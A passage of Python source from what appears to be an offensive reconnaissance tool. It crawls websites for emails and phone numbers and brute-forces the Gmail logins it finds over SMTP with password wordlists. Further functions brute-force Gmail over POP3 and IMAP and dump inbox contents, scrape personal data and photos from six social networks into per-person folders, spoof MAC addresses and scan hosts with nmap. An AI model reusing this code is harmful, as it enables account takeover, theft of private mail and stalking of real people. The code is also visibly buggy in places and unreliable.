        self.links.append(ip+':'+str(port))
        self.links=list(set(self.links))
        for url in self.links:
            if url not in self.smedia:
                res=requests.get(url)
                soup=BeautifulSoup(res.content,'html5lib')
                link=list(set([a['href'] for a in soup.findAll('a') if a['href']]))
                buts=soup.findAll('input',type='button')
                dt={'status_code':res.status_code,'header':res.headers,'encoding':res.encoding,'links':link,'images':list(set([i['src'] for i in soup.findAll('img')])),'content':res.content,'contact':self.contact(res),'mail':None,'facebook':None,'github':None,'instagram':None,'linkedin':None,'twitter':None,'youtube':None}
                self.mailparse(res.content+'\n'.join(link),url,k)
            else:
                self.smediaparse(link,url,k)
            self.links.append(url)
            self.detail[k]['web'][url]=dt

    # Social media parse
    def smediaparse(self,link,url,k):
        if 'facebook.com' in link:
            newt=Thread(target=self.facebook,args=(link,'user','password',url,k,))
        elif 'github.com' in link:
            newt=Thread(target=self.github,args=(link,'user','password',url,k,))
        elif 'instagram.com' in link:
            newt=Thread(target=self.instagram,args=(link,'user','password',k,))
        elif 'linkedin.com' in link:
            newt=Thread(target=self.linkedin,args=(link,'user','password',k,))
        elif 'twitter.com' in link:
            newt=Thread(target=self.twitter,args=(link,k,))
        elif 'youtube.com' in link:
            newt=Thread(target=self.youtube,args=(link,k,))
        newt.start()
        self.thread.append(newt)

    # Mail pasre
    def mailparse(self,res,url,k):
        for mail in re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.com", res):
            if mail not in self.detail[k]['web'][url]['mail']:
                self.detail[k]['web'][url]['mail']={mail:None}
                newt=Thread(target=self.gmail,args=(mail,k))
                newt.start()
                self.thread.append(newt)

    # directory search
    def dirscan(self,ip,k):
        for path in self.wordlist(self.arg):
            try: res=requests.get(ip+'/'+path).status_code
            except: 'Not fonund'
            if res=="200":
                self.links.append(ip+'/'+path)
                newt=Thread(target=self.dirscan,args=(ip+'/'+path,k,))
                newt.start()
                self.thread.append(newt)
    
    # Get contact information
    def contact(self,res):
        c=[]
        for mob in [match.number for match in phonenumbers.PhoneNumberMatcher(res.text,'IN')]:
            x=phonenumbers.parse('+'+str(mob.country_code)+str(mob.national_number),None)
            c.append({'number':str(x.country_code)+str(x.national_number),'name':carrier.name_for_number(x,'en'),'timezone':timezone.time_zones_for_number(x)[0],'country':geocoder.description_for_number(x,'en')})
        return c
        
    # Gmail hack
    def gmail(self,mail,k):
        smtp=smtplib.SMTP('smtp.gmail.com',587)
        smtp.ehlo()
        smtp.starttls()
        for _,passwd in self.wordlist(self.arg):
            try:
                smtp.login(mail,passwd)
                self.detail[k]['mail'][mail]=passwd
            except smtplib.SMTPAuthenticationErsmtp: pass
        smtp.quit()

    # Get social media information
    def facebook(self,muser,uid,pwd,url,k):
        browser=Chrome(self.wdriver,options=self.options)
        browser.get('https://www.facebook.com/')
        sleep(2)
        userid=browser.find_element_by_id('email')
        passwd=browser.find_element_by_id('pass')
        login=browser.find_element_by_id('login')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(2)
        browser.get(muser)
        sleep(2)
        # Gather about details
        try:
            name=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div[2]/div/div/div[1]/div/div/div/div/span/h1').text
            userinfo=[]
            links=[]
            for about in self.about:
                try:
                    browser.get(muser+about)
                    sleep(2)
                    p=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[4]/div/div/div/div[1]/div/div/div/div/div[2]')
                    userinfo.append(p.text)
                    for l in list(set([l.get_attribute('href') for l in p.find_elements_by_tag_name('a') if l.get_attribute('href')])): links.append(l)
                except Exception as e: pass
            self.detail[k]['web'][url]['facebook']={name:muser}
            os.mkdir(name+'_facebook')
            with open(name+'_facebook/'+name+'.txt','w') as fp:
                for info in userinfo: fp.write(info)
            self.detail[k]['web'][url]['facebook']['info']=userinfo
            self.detail[k]['web'][url]['facebook']['contact']=self.contact('\n'.join(userinfo))
            self.mailparse('\n'.join(userinfo)+'\n'.join(links),url,k)
            for link in links:
                if link in self.smedia and link not in self.links:self.smediaparse(link,url,k)
            # Gather profile pictures
            try: #people name
                browser.get(browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div[1]/div/div/div/a').get_attribute('href')) # profile image link
                sleep(2)
                profile=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[4]/div/div/div[1]/div/div[3]/div[2]/div/div[2]/div/div[1]/div/div[2]/div/img').get_attribute('src') # profile image
                sleep(2)
                urlretrieve(profile,name+'_facebook/'+name+'.jpg')
            except Exception as e: pass
            try: # photos xpath 
                browser.get(muser+'/photos')
                picpanel=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[4]/div/div/div/div[1]/div/div/div/div/div[3]')
                self.detail[k]['web'][url]['facebook']['img_links']=[pic.get_attribute('href') for pic in picpanel.find_elements_by_tag_name('a')]
                    # urlretrieve(browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[4]/div/div/div[1]/div/div[3]/div[2]/div/div[2]/div/div[1]/div/div[2]/div/img').get_attribute('src'),name+'_facebook/'+name+str(i)+'.jpg')
            except Exception as e: pass
        except: pass
        browser.quit()

    def github(self,muser,uid,pwd,url,k):
        browser=Chrome(self.wdriver,options=options)
        browser.get('https://github.com/login')
        sleep(2)
        userid=browser.find_element_by_id('login_field')
        passwd=browser.find_element_by_id('password')
        login=browser.find_element_by_name('commit')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(2)
        browser.get(muser)
        sleep(2)
        try:
            name=browser.find_element_by_xpath('//*[@id="js-pjax-container"]/div[2]/div/div[1]/div/div[2]/div[2]/h1/span[1]').text
            self.detail[k]['web'][url]['github']={name:muser}
            main=browser.find_element_by_tag_name('body')
            links=list(set([l.get_attribute('href') for l in main.find_elements_by_tag_name('a') if l.get_attribute('href')]))
            cont=main.text+'\n'.join(links)
            open(name+'_github/'+name+'.txt','w').write(cont)
            self.detail[k]['web'][url]['github']['contact']=self.contact(cont)
            self.mailparse(cont,url,k)
            for link in links:
                if link in self.smedia and link not in self.links: 
                    self.links.append(link)
                    self.smediaparse(link,url,k)
            try:
                minfo=browser.find_element_by_xpath('//*[@id="js-pjax-container"]/div[2]/div/div[2]/div[2]/div/div[1]/div/article')
                os.mkdir(name+'_github')
                open(name+'_github/'+name+'.txt','w').write(minfo.text)
                for i,m in enumerate([src for src in [i.get_attribute('src') for i in minfo.find_elements_by_tag_name('img')] if 'camo.githubusercontent.com' in src]): urlretrieve(m,name+'_github/'+name+str(i)+'.jpg')
            except Exception as e: pass
            self.detail[k]['web'][url]['github']['project']=[{'programming':p.text.split('\n')[-1],'name':p.text.split('\n')[0],'link':p.find_element_by_tag_name('a').get_attribute('href')} for p in browser.find_element_by_tag_name('ol').find_elements_by_tag_name('li')]
            try:
                plink=browser.find_element_by_xpath('//*[@id="js-pjax-container"]/div[2]/div/div[1]/div/div[2]/div[1]/a').get_attribute('href')
                browser.get(plink)
                profile=browser.find_element_by_tag_name('img').get_attribute('src')
                urlretrieve(profile,name+'_github/'+name+'.jpg')
            except Exception as e: pass
        except: pass
        browser.quit()

    def instagram(self,muser,uid,pwd,url,k):
        browser=Chrome(self.wdriver,options=self.options)
        browser=Chrome(r'chromedriver',options=options)
        browser.get('https://www.instagram.com/accounts/login/')
        sleep(2)
        userid=browser.find_element_by_name('username')
        passwd=browser.find_element_by_name('password')
        login=browser.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[3]/button/div')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(3)
        browser.get(muser)
        sleep(2)
        try:
            name=browser.find_element_by_xpath('/html/body/div[1]/section/main/div/header/section/div[1]/h2').text
            self.detail[k]['web'][url]['instagram']={name:muser}
            self.detail[k]['web'][url]['instagram']['posts']=list(set([l.get_attribute('href') for l in browser.find_element_by_xpath('/html/body/div[1]/section/main/div/div[2]/article').find_elements_by_tag_name('a')]))
        except:pass
        browser.quit()

    def linkedin(self,muser,uid,pwd,url,k):
        browser=Chrome(self.wdriver,options=self.options)
        browser.get('https://www.linkedin.com/login')
        sleep(3)
        userid=browser.find_element_by_id('username')
        passwd=browser.find_element_by_id('password')
        login=browser.find_element_by_xpath('/html/body/div/main/div[2]/div[1]/form/div[3]/button')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(3)
        browser.get(muser)
        sleep(2)
        try:
            userinfo=[]
            name=browser.find_element_by_xpath('/html/body/div[8]/div[5]/div/div/div/div/div[2]/div/main/div/div[1]/section/div[5]/div[2]/div[1]/ul[1]/li[1]').text
            main=browser.find_element_by_xpath('/html/body/div[8]/div[5]/div/div/div/div/div[2]/div/main/div')
            for m in main.find_elements_by_tag_name('section'):
                userinfo.append(m.text)
            profile=browser.find_element_by_xpath('/html/body/div[8]/div[5]/div/div/div/div/div[2]/div/main/div/div[1]/section/div[5]/div[1]/div[1]/div/div/button/img').get_attribute('src')
            browser.get(muser+'/detail/contact-info/')
            sleep(30)
            links=list(set(c.get_attribute('href') for c in browser.find_element_by_xpath('/html/body/div[4]/div/div/div[2]/section/div/div[1]/div').find_elements_by_tag_name('a')))
            cont='\n'.join(userinfo)+'\n'.join(links)
            self.detail[k]['web'][url]['linkedin']['contact']=self.contact(cont)
            self.mailparse(cont,url,k)
            for link in links:
                if link in self.smedia and link not in self.links:
                    self.links.append(link)
                    self.smediaparse(link,url,k)
            os.mkdir(name+'_linkedin')
            open(name+'_linkedin/'+name+'.txt','w').write(cont)
            self.detail[k]['web'][url]['linkedin']={name:muser}
            urlretrieve(profile,name+'_linkedin/'+name+'.jpg')
        except Exception as e: print(e)
        browser.quit()

    def twitter(self,muser,url,k): # https://twitter.com/siva
        browser=Chrome(self.wdriver,options=self.options)
        browser.get(muser)
        sleep(3)
        try:
            name=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div/div[2]/div/div/div[1]/div[2]/div[2]/div/div/div[1]/div/span[1]/span').text
            main=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div')
            cont=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div/div[2]/div/div/div[1]/div[2]').text
            tc=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div/div[2]/div/div/div[2]/section/div/div')
            twets=[]
            conts=cont
            for twet in tc.find_elements_by_tag_name('article'):
                conts+=twet.text
                twets.append({twet.text:twet.find_element_by_tag_name('img').get_attribute('src')})
            self.detail[k]['web'][url]['twitter']={name:muser}
            links=list(set([l.get_attribute('href') for l in main.find_elements_by_tag_name('a') if l.get_attribute('href')]))
            conts+='\n'.join(links)
            self.detail[k]['web'][url]['twitter']['contact']=self.contact(conts)
            self.mailparse(conts,url,k)
            for link in links:
                if link in self.smedia and link not in self.links:
                    self.links.append(link)
                    self.smediaparse(link,url,k)
            os.mkdir(name+'_twitter')
            open(name+'_twitter/'+name+'.txt','w').write(cont+'\n'.join(links))
            open(name+'_twitter/'+name+'twt.txt','w').write('\n'.join(twets))
            # profile
            browser.get(muser+'/photo')
            urlretrieve(browser.find_element_by_xpath('/html/body/div/div/div/div[1]/div[2]/div/div/div/div/div/div[2]/div[2]/div[1]/div/div/div/div/div/img'),name+'/'+name+'.jpg')
        except:pass
        browser.quit()

    def youtube(self,muser,url,k): # https://www.youtube.com/channel/
        browser=Chrome(self.wdriver,options=self.options)
        browser.get(muser+'/about')
        sleep(3)
        try:
            name=browser.find_element_by_xpath('/html/body/ytd-app/div/ytd-page-manager/ytd-browse[2]/div[3]/ytd-c4-tabbed-header-renderer/app-header-layout/div/app-header/div[2]/div[2]/div/div[1]/div/div[1]').text
            main=browser.find_element_by_xpath('/html/body/ytd-app/div/ytd-page-manager/ytd-browse[2]/ytd-two-column-browse-results-renderer/div[1]/ytd-section-list-renderer/div[2]/ytd-item-section-renderer')
            links=list(set([l.get_attribute('href') for l in main.find_elements_by_tag_name('a') if l.get_attribute('href')]))
            cont=main.text+'\n'.join(links)
            self.detail[k]['web'][url]['twitter']['contact']=self.contact(cont)
            self.mailparse(cont,url,k)
            for link in links:
                if link in self.smedia and link not in self.links:
                    self.links.append(link)
                    self.smediaparse(link,url,k)
            os.mkdir(name+'_youtube')
            open(name+'_youtube/'+name+'.txt','w').write(cont)
            self.detail[k]['web'][url]['youtube']={name:muser}
            profile=browser.find_element_by_xpath('/html/body/ytd-app/div/ytd-page-manager/ytd-browse/div[3]/ytd-c4-tabbed-header-renderer/app-header-layout/div/app-header/div[2]/div[2]/div/div[1]/yt-img-shadow/img').get_attribute('src')
            urlretrieve(profile,name+'_youtube/'+name+'.jpg')
        except:pass
        browser.quit()

    # POP3 hack 110 ,https://www.shellhacks.com/retrieve-email-pop3-server-command-line/
    def hackpop3(self): pass

    # Windows RPC hack 135
    def hackwinrpc(self): pass

    # windows netbios over tcp/ip hack 137-139
    def hackwinnet(self): pass

    # Microsoft SQL server hack 1433 and 1434
    def hacksql(self): pass

    # common functions
    # MAC changer
    def macchange(self,interface):
        subprocess.call(['ifconfig',interface,'down'])
        random_mac,charset='00','0123456789abcdf'
        for i in range(7): random_mac=random_mac+":"+random.choice(charset)+random.choice(charset)
        subprocess.call(['ifconfig',interface,'hw','ether',random_mac])
        subprocess.call(['ifconfig',interface,'up'])
        new_mac=re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w',subprocess.check_output(['ifconfig',interface]).decode())
        if new_mac.group(0): return new_mac.group(0)
        else: return 'Something went wrong'

    # Download wordlist
    def dwordlists(self):
        wname=['apache-user-enum-1.0.txt','apache-user-enum-2.0.txt','directory-list-1.0.txt','directory-list-2.3-big.txt','directory-list-2.3-medium.txt','directory-list-2.3-small.txt','directory-list-lowercase-2.3-big.txt','directory-list-lowercase-2.3-medium.txt','directory-list-lowercase-2.3-small.txt']
        os.system('curl -L -o '+self.path+'/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt')
        for name in wname: os.system('curl -L -o '+self.path+'/'+name+' https://github.com/daviddias/node-dirbuster/tree/master/lists/'+name)

    # Wordlist generator
    def wordlist(self):
        wrdlst=[os.path.join(self.path,fname) for fname in [f for r,d,f in os.walk('wordlists/')][0]][self.arg.wrdlstoption]
        if wrdlst==[]: 
            self.dwordlists()
            wrdlst=[os.path.join(self.path,fname) for fname in [f for r,d,f in os.walk('wordlists/')][0]][self.arg.wrdlstoption]
        for wrd in open(wrdlst,'rb').readlines(): yield wrd.decode().strip()
        CHRS=self.CHRS[:self.CHRS.index(self.arg.c)]
        num=self.num[:self.num.index(self.arg.n)]
        sym=self.sym[:self.sym.index(self.arg.s)]
        final=num+CHRS+CHRS.upper()+sym
        for x in itertools.product(self.final,repeat=self.arg.l): yield ''.join(x)
        # for w in BASIC().wordlist(4,'3','b','@'): print(w)

    def handle(self,var,val):
        try: return eval(val)
        except: return None

    def error(self,code):
        try: return eval(code)
        except: pass

# Unsed useful codes here
class UNUSEDCODE:
    def __init__(self):
        self.np=nmap.PortScanner()

    # Nmap scan
    def nscan(self,ip,mac,k):
        cinfo,pary={},{}
        osary,self.acry=[],[]
        try:
            client=self.np.scan(hosts=ip,arguments='-p- -A')['scan'][ip]
            # print(client)
            cinfo['name']=self.handle(client['hostnames'],"var[0]['name']")
            cinfo['type']=self.handle(client['hostnames'],"var[0]['type']")
            cinfo['ipv4']=client['addresses']['ipv4']
            cinfo['mac']=self.handle(client['addresses'],"var['mac']")
            for o in client['osmatch']:
                osin={}
                osin['name']=self.handle(o,"var['name']")
                osin['accuracy']=self.handle(o,"var['accuracy']")
                osin['osclass']=self.handle(o,"var[osclass]")
                self.acry.append(osin['accuracy'])
                osary.append(osin)
            cinfo['osmatch']=self.handle(osary,"var[self.acry.index(max(self.acry))]")
            for p in client['tcp'].keys():
                pin={}
                pin['port']=p
                pin['name']=self.handle(client['tcp'][p],"var['service']['name']")
                pin['product']=self.handle(client['tcp'][p],"var['service']['product']")
                pin['version']=self.handle(client['tcp'][p],"var['service']['version']")
                pin['reason']=self.handle(client['tcp'][p],"var['reason']")
                pin['state']=self.handle(client['tcp'][p],"var['state']")
                pin['extrainfo']=self.handle(client['tcp'][p],"var['service']['extrainfo']")
                pin['cpe']=self.handle(client['tcp'][p],"var['cpe'][0]")
                pin['scripts']=self.handle(client['tcp'][p],"var['scripts']")
                pin['warning']=self.analyze(pin['scripts'])
                pary[len(pary)+1]=pin
            cinfo['ports']=pary
            self.detail[k]['nmap']=cinfo
        except Exception as e: print(e)

    # Mail hack
    def smailhack(self):
        # SMTP
        smtp=smtplib.SMTP('smtp.gmail.com',587)
        smtp.ehlo()
        smtp.starttls()
        for user,passwd in self.wordlist(self.arg):
            try:
                smtp.login(user+'@gmail.com',passwd)
                self.detail['mail'][user]={'user':user,'passwd':passwd}
            except smtplib.SMTPAuthenticationErsmtp: pass
        smtp.quit()

    def pmailhack(self):
        # POP3
        pop=poplib.POP3_SSL('pop.googlemail.com','995')
        for user,passwd in self.wordlist(self.arg):
            pop.user(user)
            pop.pass_(passwd)
            for user,passwd in self.wordlist(self.arg):
                try:
                    pop.user(user+'@gmail.com')
                    pop.pass_(passwd)
                    self.detail['mail']['pop']={'user':user,'passwd':passwd}
                    self.detail['mail']['pop'][user]=[]
                    for i in range(len(pop.list()[1])):
                        for msg in pop.retr(i+1)[1]: self.detail['mail']['pop'][user].append(msg)
                except: pass
        pop.quit()

    def imailhack(self):
        imap=imaplib.IMAP4_SSL('imap.gmail.com')
        for user,passwd in self.wordlist(self.arg):
            imap.user(user)
            imap.pass_(passwd)
            for user,passwd in self.wordlist(self.arg):
                try:
                    imap.login(user+'@gmail.com',passwd)
                    self.detail['mail']['imap']={'user':user,'passwd':passwd}
                    self.detail['mail']['imap'][user]=[]
                    imap.select('Inbox')
                    tmp,data=imap.search(None,'ALL')
                    for n in data[0].split():
                        tmp,data=imap.fetch(n,'(RFC822)')
                        self.detail['mail']['imap'][user].append([n,data[0][1]])
                except: pass
        imap.close()

    # Information gathering
    def socialmedia(self,user,k):
        os.mkdir(user)
        newt=Thread(target=self.facebook,args=(user,'user','password',k,))
        newt.start()
        self.thread.append(newt)
        newt=Thread(target=self.instagram,args=(user,'user','password',k,))
        newt.start()
        self.thread.append(newt)
        newt=Thread(target=self.twitter,args=(user,'user','password',k,))
        newt.start()
        self.thread.append(newt)
        newt=Thread(target=self.linkedin,args=(user,'user','password',k,))
        newt.start()
        self.thread.append(newt)
        newt=Thread(target=self.youtube,args=(user,'user','password',k,))
        newt.start()
        self.thread.append(newt)

    def facebook(self,muser,uid,pwd):
        browser=Chrome(r'resource/chromedriver',options=self.options)
        browser.get('https://www.facebook.com/')
        sleep(3)
        userid=browser.find_element_by_id('email')
        passwd=browser.find_element_by_id('pass')
        login=browser.find_element_by_id('login')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(5)
        browser.get('https://www.facebook.com/search/people/?q='+muser)
        sleep(3)
        # Gather about details
        for i,user in enumerate([people.get_attribute('href') for people in browser.find_elements_by_class_name('nc684nl6') if people.get_attribute('href')]):
            userinfo=[]
            for about in self.about:
                try:
                    browser.get(user+about)
                    sleep(3)
                    userinfo.append(browser.find_element_by_xpath('//*[@id="mount_0_0"]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[4]/div/div/div/div[1]/div/div/div/div/div[2]').text)
                except Exception as e: print(e)
            # Gather profile pictures
            try: #people name
                name=browser.find_element_by_xpath('//*[@id="mount_0_0"]/div/div[1]/div[1]/div[3]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div[2]/div/div/div[1]/div/div/div/div/span/h1').text
                os.mkdir(name+'_facebook')
                with open(muser+'/'+name+'_facebook/'+name+str(i)+'.txt','w') as fp:
                    for info in userinfo: fp.write(info)
                browser.get(browser.find_element_by_xpath('//*[@id="mount_0_0"]/div/div[1]/div[1]/div[3]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div[1]/div/div/div/a').get_attribute('href')) # profile image link
                sleep(3)
                profile=browser.find_element_by_xpath('//*[@id="mount_0_0"]/div/div[1]/div[1]/div[3]/div/div/div[1]/div[1]/div/div[1]/div/div[1]/div/div[2]/div/img').get_attribute('src') # profile image
                sleep(1)
                urlretrieve(profile,muser+'/'+name+'_facebook/'+name+str(i)+'.jpg')
                browser.get(user+'/photos')
                # photos xpath 
                picpanel=browser.find_element_by_xpath('//*[@id="mount_0_0"]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[4]/div/div/div/div[1]/div/div/div/div/div[3]')
                for i,picl in enumerate([pic.get_attribute('href') for pic in picpanel.find_elements_by_tag_name('a')]):
                    browser.get(picl)
                    urlretrieve(browser.find_element_by_xpath('//*[@id="mount_0_0"]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div[1]/div/div[1]/div/div[2]/div/img').get_attribute('src'),muser+'/'+name+'_facebook/'+peoplename+str(i)+'.jpg')
            except Exception as e: print(e)

    # Contact number parse
    def phonenum(self,soup,res):
        for mob in soup.select('a[href*=callto]'): self.detail[k]['contact'][mob.text]=None #[0]
        for mob in re.findall(r'\(?\b[2-9][0-9]{2}\)?[-][2-9][0-9]{2}[-][0-9]{4}\b',res.text): self.detail[k]['contact'][mob.text]=None #[0]
        for mob in re.findall(r'\(?\b[2-9][0-9]{2}\)?[-. ]?[2-9][0-9]{2}[-. ]?[0-9]{4}\b',res.text): self.detail[k]['contact'][mob.text]=None #[-1]